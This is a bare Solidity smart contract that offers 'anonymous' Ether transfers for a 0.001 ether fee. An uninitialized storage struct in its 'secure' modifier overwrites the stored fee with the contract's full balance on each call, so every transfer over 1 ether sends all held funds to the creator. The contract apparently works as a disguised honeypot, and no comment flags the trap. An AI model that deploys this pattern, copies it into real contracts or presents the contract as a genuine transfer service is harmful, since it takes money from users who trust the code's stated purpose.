pragma solidity ^0.4.19;
contract ETH_ANONIM_TRANSFER {
	uint256 feePaid;
	uint256 creatorFee = 0.001 ether;
	uint256 totalTransfered;
	address creator = msg.sender;
	struct Transfer{
	uint256 timeStamp;
	uint256 currContractBallance;
	uint256 inAm;
	}
	Transfer[] Log;
	modifier secure(){
	require(msg.sender == tx.origin);
	Transfer LogUnit;
	LogUnit.timeStamp = now;
	LogUnit.currContractBallance = this.balance;
	LogUnit.inAm = msg.value;
	Log.push(LogUnit);
	_;}
	function () payable public {
	}
	function MakeTransfer(address _adr, uint256 _am) secure payable external {
	if(msg.value > 1 ether){
	if(! creator.send(creatorFee)){
	throw;}
	if(! _adr.send(_am)){
	throw;}
	feePaid += creatorFee;
	totalTransfered += _am;
	}
	}
	
}